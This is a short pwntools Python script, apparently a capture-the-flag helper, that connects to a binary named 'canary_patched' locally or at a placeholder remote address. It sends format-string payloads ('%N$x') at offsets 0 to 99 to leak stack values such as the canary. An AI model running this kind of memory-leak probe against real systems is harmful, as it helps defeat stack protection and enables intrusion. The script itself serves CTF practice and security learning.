#!/usr/bin/env python3

from pwn import *

exe = ELF("./canary_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():

    context.log_level = 'warning'

    # good luck pwning :)

    for i in range(100):
       try:
           r = conn()
           r.sendlineafter(b'!', '%{}$x'.format(i).encode())
           r.recvline()
           result = r.recvline().decode()
           if result:
              print(str(i) + ": " + str(result).strip())
           r.close()
       except EOFError:
           pass

if __name__ == "__main__":
    main()
